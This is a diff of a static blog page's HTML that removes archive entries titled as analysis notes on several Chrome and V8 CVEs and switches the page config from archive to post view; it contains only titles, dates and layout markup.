-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-01-18T13:44:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-18</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/18/chrome-cve-2021-21220%E5%88%86%E6%9E%90/">chrome cve-2021-21220分析笔记</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/15/chrome-cve-2018-6065%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-01-15T09:21:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/15/chrome-cve-2018-6065%E5%88%86%E6%9E%90/">chrome cve-2018-6065 分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2022/01/13/cve-2019-13698%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2022-01-13T02:12:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/01/13/cve-2019-13698%E5%88%86%E6%9E%90/">chrome v8 CVE-2019-13698简要分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -363,8 +368,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
